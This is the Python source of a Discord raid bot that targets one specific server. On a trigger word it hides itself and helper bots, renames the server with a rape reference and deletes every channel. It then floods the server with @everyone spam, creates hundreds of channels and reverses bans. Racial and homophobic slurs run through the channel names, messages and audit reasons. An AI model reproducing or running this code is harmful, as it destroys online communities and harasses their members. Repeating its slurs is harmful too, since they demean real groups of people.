import discord
import random
import os
from six.moves import configparser

targetGuildId = 454058863600074753
botChildrenId = [
465739288336793612,
465911019412389889,
465911478445146112,
465911532958777347,
465911598557691904,
465911702861512724
]

payloadHead = '@everyone\n<@250803093049049089><@254683345735254016><@347507600541089793><@347735227055210496>\n'
payloadTail = '**ITS SPAM TIME MY NI:b::b:AS**'
squidwards = [
'https://media.giphy.com/media/PqXQV58Tva7DO/giphy.gif\n'
]
fuckedUpShit = [
'https://media.giphy.com/media/hLx1RYpEamdj2/giphy.gif\n'
]

ownerPayload = 'yo ni:b::b:a, your server is under attack! You best fix it!'

bot = discord.Client()
bot.raid = False

async def spammer_task(guild):
    print('[SPAMMER-TASK] Spamming...')
    while True:
        for channel in guild.channels:
            for _ in range(5):
                await channel.send(payloadHead + random.choice(squidwards) + random.choice(squidwards) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + payloadTail)
        for _ in range(5):
            await guild.owner.send(ownerPayload)

@bot.event
async def on_ready():
    print('API Connected.')

    print('Setting hidden username and icon...')
    file = open('hidden.png', 'rb')
    try:
        await bot.user.edit(username='🏴-', avatar=file.read())
    except:
        pass

    print('Setting status to invisible...')
    await bot.change_presence(status=discord.Status.invisible)

    print('Finding target guild by ID...')
    guild = bot.get_guild(targetGuildId)
    if guild == None:
        print('Bot is not in target server, or it does not exist.')
        exit()
    print('Found guild named "' + guild.name + '".')

    print('Looking for child bots...')
    botChildren = []
    for childId in botChildrenId:
        child = guild.get_member(childId)
        if child == None:
            print('ERROR: child bot not found with ID: ' + str(childId))
            exit()
        else:
            botChildren.append(child)

    print('Hiding child bots...')
    for channel in guild.channels:
        for childBot in botChildren:
            await channel.set_permissions(childBot, read_messages=False)

    print('===== Ready for raid. Say "RAID" in the target guild to rape this server. =====')
    def check(m):
        return ('RAID' in m.content) and m.guild == guild
    await bot.wait_for('message', check=check)

    bot.raid = True
    print('================================')
    print('========== RAID START ==========')
    print('================================')

    print('Changing name and icon...')
    file = open('daddy.png', 'rb')
    try:
        await bot.user.edit(username='Daddy Squidward', avatar=file.read())
    except:
        pass

    print('Bringing bot online...')
    await bot.change_presence(status=discord.Status.online)
    await bot.change_presence(game=discord.Game(name='server gang-rape'))

    print('Setting server settings...')
    file = open('servericon.png', 'rb')
    try:
        await guild.edit(name='Squidward\'s Rape Vault', icon=file.read(), reason='===== BEGIN RAID =====')
    except:
        pass

    print('Deleting channels...')
    for channel in list(guild.channels):
        await channel.delete(reason='Deleting cancerous memes')

    print('Starting spammerTask...')
    bot.loop.create_task(spammer_task(guild))

    print('Creating channels and signaling children...')
    global channelAdd
    channelAdd = True
    while channelAdd:
        try:
            newchannel = await guild.create_text_channel('spam-time-niggers', reason='you are big fag')
            await newchannel.send(payloadHead + random.choice(squidwards) + random.choice(squidwards) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + payloadTail)
        except:
            pass
        if len(guild.channels) > 499:
            channelAdd = False

    print('Server is full of channels.')

@bot.event
async def on_guild_channel_delete(channel):
    if channel.name == 'spam-time-niggers' and not channelAdd:
        newchannel = await channel.guild.create_text_channel('spam-time-niggers', reason='you are big fag')
        await newchannel.send(payloadHead + random.choice(squidwards) + random.choice(squidwards) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + random.choice(fuckedUpShit) + payloadTail)

@bot.event
async def on_member_ban(guild, user):
    if bot.raid:
        try:
            await guild.unban(user, reason='you are big fag')
        except:
            pass
        if user.bot:
            print('A bot was banned! I have unbanned it. Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(user.id) + '&permissions=0&scope=bot')
        else:
            invite = await guild.channels[0].create_invite(reason='you are big fag')
            await member.send('Oh no! looks like someone banned you! I have unbanned you, as the server is currently under a raid by yours truely!\nHere is your invite link so you can come and enjoy more @everyone spam: ' + invite.url)

@bot.event
async def on_member_remove(member):
    if bot.raid:
        if member.bot:
            print('A bot was kicked! Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(member.id) + '&permissions=0&scope=bot')
        else:
            invite = await member.guild.channels[0].create_invite(reason='you are big fag')
            await member.send('Oh no! looks like someone kicked you! I have created an invite for you, as the server is currently under a raid by yours truely!\nHere is your invite link so you can come and enjoy more @everyone spam: ' + invite.url)

filename = "bot.cfg"
if os.path.isfile(filename):
    config = configparser.ConfigParser()
    config.read(filename)
    token = config.get("config", "token")
else:
    print('ERR_EXIT_CODE = "1"')
    exit(1)

bot.run(token, bot=True, reconnect=True)
